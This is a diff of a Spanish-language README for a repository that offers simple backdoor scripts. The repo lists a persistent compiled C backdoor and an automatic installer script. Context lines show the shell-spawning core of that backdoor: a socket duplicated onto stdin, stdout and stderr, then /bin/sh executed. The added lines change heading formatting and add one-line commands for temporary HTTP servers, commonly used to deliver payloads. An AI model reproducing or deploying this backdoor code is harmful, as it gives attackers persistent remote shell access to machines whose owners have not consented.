@@ -7,7 +7,7 @@ Simples Script en distintos lenguakes, para crear una backdoor o puertra trasera
 
 ---
 
-## 📋 Tabla de Contenido
+### Tabla de Contenido
 
 - [Características](#-características)
 - [Archivos del Repositorio](#-archivos-del-repositorio)
@@ -20,7 +20,7 @@ Simples Script en distintos lenguakes, para crear una backdoor o puertra trasera
 
 ---
 
-## ✨ Características
+### Características
 
 - Backdoor en C compilado (persistente)
 - Script de instalación automática (`instalar.sh`)
@@ -69,5 +69,16 @@ dup2(client_fd, 0);  // stdin
 dup2(client_fd, 1);  // stdout
 dup2(client_fd, 2);  // stderr
 execl("/bin/sh", "sh", NULL);
+
+```
+
+### Serbidores HTTP temporales:
+
+Lenguaje,Comando
+BusyBox,busybox httpd -f -p 8000
+Python 2,python -m SimpleHTTPServer 8000
+Python 3,python -m http.server 8000
+Ruby,"ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start'"
+PHP,php -S 127.0.0.1:8000
 
 
